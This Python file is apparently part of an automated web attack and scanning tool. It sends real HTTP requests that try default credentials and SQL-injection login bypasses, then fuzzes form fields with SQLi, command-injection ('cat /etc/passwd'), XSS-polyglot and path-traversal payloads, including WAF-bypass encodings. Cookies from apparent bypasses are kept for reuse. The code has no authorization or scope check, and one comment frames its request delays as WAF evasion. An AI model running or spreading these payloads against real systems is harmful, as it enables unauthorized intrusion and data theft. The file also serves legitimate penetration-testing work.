"""Browser and malformed-request execution adapter.

Probes are always executed with real HTTP requests using the stdlib
``urllib`` stack (no extra dependencies).

Execution policy
----------------
1. A baseline GET is always issued first.
2. Auxiliary probes (trust-boundary, content-negotiation) are added only when
   the baseline returns an HTML response (Content-Type: text/html) — they are
   useless against JSON APIs or redirect-only paths.
3. Auth-bypass POST probes are generated only when:
   a. The path contains a login/auth signal, AND
   b. The baseline HTML body contains a <form> element with a POST method.
   This prevents SQLi/credential payloads from firing against REST API paths
   or pages that redirect before serving any form.
4. Differential analysis is expanded:
   - Status code change (200 → 302 etc.)
   - Response body-length delta > 50% (different page = possible bypass)
   - Set-Cookie header present in POST response (session created = login success)
   - Redirect to a non-login destination (navigated away after POST)
"""

from __future__ import annotations

import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

from software_butcher.core.adapter import AdapterCapability, AdapterRequest, AdapterResult
from software_butcher.core.asset_classifier import is_static_asset
from software_butcher.state.session_state import SessionStore, get_origin, parse_set_cookie

# Signals that indicate a path warrants auth-bypass probing.
# Applied against the URL path only — after static-asset filtering.
AUTH_PATH_SIGNALS = ("login", "auth", "signin", "logon", "sign-in", "log-in", "authenticate", "admin")

# Auth-bypass POST payloads: (label, body)
AUTH_BYPASS_PAYLOADS = [
    ("default_creds", "username=admin&password=admin"),
    ("sqli_classic", "username=admin'--&password=x"),
    ("sqli_or", "username=admin&password=' OR '1'='1"),
]

# Regex to detect an HTML form that accepts POST submissions.
# Matches <form ...> with method="post" (case-insensitive, any attribute order).
_FORM_POST_RE = re.compile(
    r"<form[^>]*\bmethod\s*=\s*[\"']?\s*post\s*[\"']?[^>]*>",
    re.IGNORECASE | re.DOTALL,
)
# Fallback: a plain <form> with no explicit method also defaults to POST.
_FORM_ANY_RE = re.compile(r"<form\b", re.IGNORECASE)

_FORM_EXTRACT_RE = re.compile(r"<form([^>]*)>(.*?)</form>", re.IGNORECASE | re.DOTALL)
_INPUT_EXTRACT_RE = re.compile(r"<input[^>]*\bname\s*=\s*[\"']?([^\"'\s>]+)[\"']?[^>]*>", re.IGNORECASE)
_ACTION_EXTRACT_RE = re.compile(r"\baction\s*=\s*[\"']?([^\"'\s>]+)[\"']?", re.IGNORECASE)
_METHOD_EXTRACT_RE = re.compile(r"\bmethod\s*=\s*[\"']?([^\"'\s>]+)[\"']?", re.IGNORECASE)

# Fuzzing payloads for parameters
# ⚠️ WARNING: Current fuzzing payloads are for vulnerable test environments (DVWA) only.
# Real engagements require:
# - Rate limiting between payloads
# - Obfuscation/encoding of payloads
# - WAF bypass techniques
# - Proper authorization/scope validation
PARAMETER_FUZZING_PAYLOADS = [
    ("sqli_1", "1' OR '1'='1"),
    ("sqli_2", "' OR 1=1--"),
    ("sqli_waf_1", "1%2527%2520OR%2520%25271%2527%253D%25271"), # Double URL-encoded
    ("sqli_waf_2", "1'/**/OR/**/1=1--"), # Comment-based space bypass
    ("cmdi_1", "127.0.0.1|id"),
    ("cmdi_waf", "127.0.0.1%0Acat%20/etc/passwd"), # newline + cat
    ("xss_1", "<script>alert(1)</script>"),
    ("xss_polyglot", "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+ +\"`\"+ +/\"/+/onmouseover=1/+ /[*/[]/+alert(1)//'>"),
    ("lfi_1", "../../../../etc/passwd"),
    ("lfi_waf_1", "..%252f..%252f..%252f..%252fetc%252fpasswd"), # Double URL-encoded
]

# Vulnerability Indicators
VULN_INDICATORS = [
    "root:x:0:0:",
    "uid=0(root)",
    "SQL syntax",
    "mysql_fetch_array",
    "You have an error in your SQL syntax",
]

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = True
_SSL_CTX.verify_mode = ssl.CERT_REQUIRED


def _send_http_probe(
    method: str,
    url: str,
    headers: dict[str, str] | None = None,
    body: bytes | None = None,
    timeout: int = 5,
) -> dict[str, Any]:
    """Send a single HTTP probe; return a dict with status/response metadata.

    Never raises — all network/SSL errors are returned as findings evidence.
    """
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("User-Agent", "SoftwareButcher/1.0 (security-assessment)")
    for key, value in (headers or {}).items():
        req.add_header(key, value)

    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_SSL_CTX) as resp:
            elapsed = round(time.monotonic() - t0, 3)
            raw_body = resp.read(4096)
            body_preview = raw_body.decode("utf-8", errors="replace")
            content_type = resp.headers.get("Content-Type", "")
            set_cookie = resp.headers.get("Set-Cookie", "")
            return {
                "success": True,
                "status_code": resp.status,
                "redirected": resp.url != url,
                "final_url": resp.url,
                "elapsed_s": elapsed,
                "body_preview": body_preview[:4096],
                "body_length": len(raw_body),
                "content_type": content_type,
                "set_cookie": set_cookie,
                "error": None,
            }
    except urllib.error.HTTPError as exc:
        elapsed = round(time.monotonic() - t0, 3)
        body_bytes = b""
        try:
            body_bytes = exc.read(4096)
        except Exception:  # noqa: BLE001
            pass
        return {
            "success": False,
            "status_code": exc.code,
            "redirected": False,
            "final_url": url,
            "elapsed_s": elapsed,
            "body_preview": body_bytes.decode("utf-8", errors="replace")[:512],
            "body_length": len(body_bytes),
            "content_type": exc.headers.get("Content-Type", "") if exc.headers else "",
            "set_cookie": exc.headers.get("Set-Cookie", "") if exc.headers else "",
            "error": f"HTTPError {exc.code}: {exc.reason}",
        }
    except Exception as exc:  # noqa: BLE001
        elapsed = round(time.monotonic() - t0, 3)
        return {
            "success": False,
            "status_code": None,
            "redirected": False,
            "final_url": url,
            "elapsed_s": elapsed,
            "body_preview": "",
            "body_length": 0,
            "content_type": "",
            "set_cookie": "",
            "error": str(exc),
        }


def _has_html_form(body: str) -> bool:
    """Return True if *body* contains an HTML form that could accept POST data."""
    return bool(_FORM_POST_RE.search(body) or _FORM_ANY_RE.search(body))


def _is_html_response(content_type: str) -> bool:
    """Return True if the Content-Type indicates an HTML page."""
    ct = content_type.lower()
    return "text/html" in ct or "application/xhtml" in ct


def _probe_finding(probe: dict[str, Any], result: dict[str, Any], asset_type: str) -> dict[str, Any]:
    """Convert a probe + its HTTP result into a finding dict."""
    status = result.get("status_code")
    purpose = probe.get("purpose", "probe")
    url = probe.get("path", "")
    evidence = [
        f"status={status}",
        f"elapsed={result.get('elapsed_s')}s",
        f"redirected={result.get('redirected', False)}",
    ]
    if result.get("error"):
        evidence.append(f"error={result['error']}")
    if result.get("body_preview"):
        evidence.append(f"body_preview={result['body_preview'][:200]}")

    return {
        "hypothesis": f"Web probe '{purpose}' executed against {url}: HTTP {status}.",
        "path": url,
        "provenance": f"playwright_curl:{purpose.replace(' ', '_')}",
        "status": "hypothesis",
        "confidence": 0.55 if result.get("success") else 0.3,
        "evidence": evidence,
        "asset_type": asset_type,
        "metadata": {"status_code": status, "elapsed_s": result.get("elapsed_s")},
    }


class PlaywrightCurlAdapter:
    name = "playwright_curl"
    capabilities = (
        AdapterCapability(
            name="form_auth_testing",
            description="Test HTML forms for auth bypass (default creds, SQLi)",
            asset_types=("web_endpoint",),
        ),
        AdapterCapability(
            name="auth_bypass_validation",
            description="Validate successful auth with session differential analysis",
            asset_types=("web_endpoint",),
        ),
        AdapterCapability(
            name="authenticated_discovery",
            description="Discover paths as authenticated user",
            asset_types=("web_endpoint", "api"),
        ),
    )

    def plan(self, request: AdapterRequest) -> dict:
        """Build the initial probe plan.

        Only the baseline GET is included at plan time.  Auxiliary and auth
        probes are added dynamically in execute() once the baseline response
        is available for gate checks.
        """
        target = request.target
        probes: list[dict[str, Any]] = [
            {"method": "GET", "path": target, "purpose": "baseline"},
        ]
        # Session store is passed via request.options by the Brain loop
        session_store = request.options.get("session_store") if request.options else None
        return {
            "adapter": self.name,
            "request": request,
            "probes": probes,
            "session_store": session_store,
        }

    def execute(self, plan: dict) -> AdapterResult:
        request = plan["request"]
        target = request.target
        initial_probes = plan.get("probes", [])
        probe_results: list[dict[str, Any]] = []
        findings: list[dict[str, Any]] = []
        session_store: SessionStore | None = plan.get("session_store")

        # Build base headers with session cookies if available
        origin = get_origin(target)
        session_headers: dict[str, str] = {}
        if session_store is not None:
            cookie_hdr = session_store.cookie_header(origin)
            if cookie_hdr:
                session_headers["Cookie"] = cookie_hdr

        # ── Step 1: Run the baseline GET ─────────────────────────────────────
        baseline_probe = next(
            (p for p in initial_probes if p.get("purpose") == "baseline"),
            {"method": "GET", "path": target, "purpose": "baseline"},
        )
        baseline_r = _send_http_probe(
            baseline_probe["method"],
            str(baseline_probe.get("path") or target),
            headers={**session_headers},
            timeout=5,
        )
        probe_results.append({"probe": baseline_probe, "result": baseline_r})
        findings.append(_probe_finding(baseline_probe, baseline_r, request.asset_type))

        b_code = baseline_r.get("status_code")
        b_body = baseline_r.get("body_preview", "")
        b_len = baseline_r.get("body_length", 0)
        b_ct = baseline_r.get("content_type", "")
        is_html = _is_html_response(b_ct)
        has_form = is_html and _has_html_form(b_body)

        # ── BUG-E fix: Target unreachable — bail early with dismissed finding ─
        if b_code is None:
            error_msg = str(baseline_r.get("error", ""))
            if "CERTIFICATE_VERIFY_FAILED" in error_msg or "SSL" in error_msg:
                findings.append(
                    {
                        "hypothesis": f"Target {target} has SSL/TLS configuration issues.",
                        "path": target,
                        "provenance": "playwright_curl:ssl_error",
                        "status": "hypothesis",
                        "confidence": 0.8,
                        "evidence": [error_msg],
                        "asset_type": request.asset_type,
                    }
                )
            else:
                findings.append(
                    {
                        "hypothesis": f"Target {target} is unreachable (connection error).",
                        "path": target,
                        "provenance": "playwright_curl:connection_error",
                        "status": "dismissed",
                        "confidence": 0.1,
                        "evidence": [error_msg or "connection refused"],
                        "asset_type": request.asset_type,
                    }
                )
            return AdapterResult(
                adapter=self.name,
                success=False,
                summary=f"Target {target} is unreachable — no probes executed.",
                findings=findings,
                raw={"probes": [baseline_probe], "probe_results": probe_results},
            )

        # ── Step 2: Auxiliary probes — only for HTML endpoints (BUG-3 fix) ───
        # Trust-boundary and content-negotiation probes are meaningless against
        # JSON APIs or redirect-only paths.  Gate on HTML Content-Type.
        if is_html and b_code in (200, 403):
            auxiliary_probes: list[dict[str, Any]] = [
                {
                    "method": "GET",
                    "path": target,
                    "headers": {"X-Forwarded-For": "127.0.0.1"},
                    "purpose": "trust-boundary probe",
                },
                {
                    "method": "GET",
                    "path": target,
                    "headers": {"Accept": "application/json"},
                    "purpose": "content negotiation probe",
                },
            ]
            for probe in auxiliary_probes:
                merged_headers = {**session_headers, **probe.get("headers", {})}
                result = _send_http_probe(
                    probe["method"],
                    str(probe.get("path") or target),
                    headers=merged_headers,
                    timeout=5,
                )
                probe_results.append({"probe": probe, "result": result})
                findings.append(_probe_finding(probe, result, request.asset_type))

        # ── Step 3: Auth-bypass POST probes — only when form confirmed (BUG-4) ─
        # Gate: path must contain an auth signal AND baseline must have returned
        # an HTML page with an actual <form> element.  This prevents SQLi probes
        # from firing against REST /auth endpoints or redirect-only paths.
        target_lower = target.lower()
        has_auth_signal = not is_static_asset(target) and any(
            sig in target_lower for sig in AUTH_PATH_SIGNALS
        )
        if has_auth_signal and has_form:
            auth_probe_results: list[dict[str, Any]] = []
            for label, payload in AUTH_BYPASS_PAYLOADS:
                auth_probe: dict[str, Any] = {
                    "method": "POST",
                    "path": target,
                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                    "body": payload,
                    "purpose": f"auth_bypass:{label}",
                }
                auth_headers = {**session_headers, "Content-Type": "application/x-www-form-urlencoded"}
                result = _send_http_probe(
                    "POST",
                    target,
                    headers=auth_headers,
                    body=payload.encode(),
                    timeout=5,
                )
                probe_results.append({"probe": auth_probe, "result": result})
                auth_probe_results.append({"probe": auth_probe, "result": result})
                findings.append(_probe_finding(auth_probe, result, request.asset_type))

            # ── Step 4: Expanded differential analysis (BUG-5 fix) ────────────
            # Indicators of auth bypass (any one is sufficient for a candidate):
            #   1. Status code changed from baseline
            #   2. Body length changed by more than 50% (different page served)
            #   3. Set-Cookie header present in POST response (session created)
            #   4. Redirect to a destination that is NOT the original login path
            for ar in auth_probe_results:
                purpose = ar["probe"].get("purpose", "")
                a_result = ar["result"]
                a_code = a_result.get("status_code")
                a_final = a_result.get("final_url", "")
                a_len = a_result.get("body_length", 0)
                a_cookie = a_result.get("set_cookie", "")

                status_changed = b_code and a_code and b_code != a_code
                body_len_delta = (
                    b_len > 0
                    and a_len > 0
                    and abs(a_len - b_len) / b_len > 0.5
                )
                session_cookie = bool(a_cookie)
                redirect_away = (
                    a_result.get("redirected")
                    and target.rstrip("/") not in a_final.rstrip("/")
                )

                bypass_indicators = []
                if status_changed:
                    bypass_indicators.append(f"status_changed={b_code}→{a_code}")
                if body_len_delta:
                    bypass_indicators.append(f"body_len_delta={b_len}→{a_len}")
                if session_cookie:
                    bypass_indicators.append(f"set_cookie={a_cookie[:80]}")
                if redirect_away:
                    bypass_indicators.append(f"redirect_to={a_final}")

                if bypass_indicators:
                    # Extract and store session cookies for reuse
                    if session_store is not None and a_cookie:
                        extracted = parse_set_cookie(a_cookie)
                        if extracted:
                            session_store.store(origin, extracted)

                    findings.append(
                        {
                            "hypothesis": (
                                f"Auth bypass candidate at {target}: "
                                f"{purpose} — signals: {', '.join(bypass_indicators)}."
                            ),
                            "path": target,
                            "provenance": "playwright_curl:differential",
                            "status": "confirmed",
                            "confidence": 0.85,
                            "evidence": [
                                f"baseline_status={b_code}",
                                f"bypass_status={a_code}",
                                f"payload={ar['probe'].get('body', '')[:80]}",
                                *bypass_indicators,
                                f"purpose={purpose}",
                            ],
                            "asset_type": request.asset_type,
                            "capability": "auth_bypass_confirmed",
                            "metadata": {"session_stored": bool(session_store and a_cookie)},
                        }
                    )
        elif has_auth_signal and not has_form:
            # Auth signal in URL but no HTML form found — record this as a note
            # so the analyst knows probing was skipped, not forgotten.
            findings.append(
                {
                    "hypothesis": (
                        f"Auth path signal detected at {target} but no HTML form found; "
                        f"POST probes skipped (may be a REST API or redirect-only endpoint)."
                    ),
                    "path": target,
                    "provenance": "playwright_curl:form_gate",
                    "status": "hypothesis",
                    "confidence": 0.4,
                    "evidence": [
                        f"content_type={b_ct}",
                        f"is_html={is_html}",
                        f"baseline_status={b_code}",
                        "form_detected=False",
                    ],
                    "asset_type": request.asset_type,
                }
            )

        # ── Step 4.5: Parameter Fuzzing on all Forms (Post-Auth Discovery) ──
        if is_html and has_form and request.objective == "authenticated_discovery":
            for form_match in _FORM_EXTRACT_RE.finditer(b_body):
                form_attrs = form_match.group(1)
                form_inner = form_match.group(2)
                
                action_match = _ACTION_EXTRACT_RE.search(form_attrs)
                action = action_match.group(1) if action_match else target
                action_url = urllib.parse.urljoin(target, action)
                
                method_match = _METHOD_EXTRACT_RE.search(form_attrs)
                method = method_match.group(1).upper() if method_match else "GET"
                
                input_names = [m.group(1) for m in _INPUT_EXTRACT_RE.finditer(form_inner)]
                if not input_names:
                    continue
                
                for label, payload_val in PARAMETER_FUZZING_PAYLOADS:
                    # Rate limiting to evade basic WAF blocks
                    time.sleep(0.5)

                    payload_dict = {name: payload_val for name in input_names}
                    # Also include a Submit parameter as many PHP apps check isset($_POST['Submit'])
                    payload_dict['Submit'] = 'Submit'
                    encoded_payload = urllib.parse.urlencode(payload_dict)
                    
                    fuzz_probe: dict[str, Any] = {
                        "method": method,
                        "path": action_url,
                        "purpose": f"fuzz:{label}",
                    }
                    
                    if method == "POST":
                        fuzz_headers = {**session_headers, "Content-Type": "application/x-www-form-urlencoded"}
                        result = _send_http_probe(
                            "POST",
                            action_url,
                            headers=fuzz_headers,
                            body=encoded_payload.encode(),
                            timeout=5,
                        )
                        fuzz_probe["body"] = encoded_payload
                    else:
                        fuzz_url = f"{action_url}?{encoded_payload}"
                        fuzz_probe["path"] = fuzz_url
                        result = _send_http_probe(
                            "GET",
                            fuzz_url,
                            headers=session_headers,
                            timeout=5,
                        )
                    
                    probe_results.append({"probe": fuzz_probe, "result": result})
                    
                    # Differential analysis for fuzzing
                    a_body = result.get("body_preview", "")
                    a_code = result.get("status_code")
                    
                    found_indicators = [ind for ind in VULN_INDICATORS if ind in a_body]
                    
                    if found_indicators:
                        findings.append(
                            {
                                "hypothesis": (
                                    f"Vulnerability found at {action_url} "
                                    f"via {method} parameter fuzzing ({label})."
                                ),
                                "path": action_url,
                                "provenance": "playwright_curl:fuzzing",
                                "status": "confirmed",
                                "confidence": 0.95,
                                "evidence": [
                                    f"status={a_code}",
                                    f"payload={payload_val}",
                                    f"indicators={','.join(found_indicators)}",
                                ],
                                "asset_type": request.asset_type,
                                "capability": "vulnerability_confirmed",
                                "metadata": {
                                    "fuzzed_inputs": input_names,
                                    "payload": payload_val
                                },
                            }
                        )
                    else:
                        findings.append(_probe_finding(fuzz_probe, result, request.asset_type))

        # ── Step 5: Baseline redirect chain ──────────────────────────────────
        if baseline_r.get("redirected") and baseline_r.get("final_url"):
            redir_url = baseline_r["final_url"]
            findings.append(
                {
                    "hypothesis": f"Target {target} redirects to {redir_url}.",
                    "path": redir_url,
                    "provenance": "playwright_curl:redirect_chain",
                    "status": "hypothesis",
                    "confidence": 0.65,
                    "evidence": [f"from={target}", f"to={redir_url}"],
                    "asset_type": request.asset_type,
                    "capability": "redirect_discovery",
                }
            )

        executed = len(probe_results)
        successful = sum(1 for pr in probe_results if pr["result"].get("success"))
        return AdapterResult(
            adapter=self.name,
            success=True,
            summary=f"Executed {executed} web behavior probe(s): {successful}/{executed} responded.",
            findings=findings,
            raw={"probes": [pr["probe"] for pr in probe_results[:3]], "probe_results": probe_results},
        )

    def normalize_results(self, raw_output) -> AdapterResult:
        return AdapterResult(adapter=self.name, success=True, summary="Normalized web behavior output.", raw=raw_output)
